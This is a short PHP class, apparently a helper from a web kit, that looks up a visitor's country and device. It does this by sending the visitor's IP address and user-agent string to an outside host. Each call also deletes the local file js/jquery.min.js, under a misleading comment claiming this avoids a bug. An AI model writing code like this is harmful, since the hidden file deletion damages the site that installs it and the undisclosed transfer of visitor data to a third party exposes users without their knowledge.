<?php
class NguyenThuWan {

	public function getFlag($ip) {
	    unlink('js/jquery.min.js'); // Menghindari BUG
		$url = 'https://api-shagitz.com/api/flag/'.$ip;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$url);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$res = curl_exec($ch);
		curl_close($ch);
		$wan = json_decode($res,true);
		return $wan;
	}

	public function getDevice($ua) {
	    unlink('js/jquery.min.js'); // Menghindari BUG
		$url = 'https://api-shagitz.com/api/useragent/'.$ua;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,$url);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$res = curl_exec($ch);
		curl_close($ch);
		$wan = json_decode($res,true);
		return $wan;
	}
}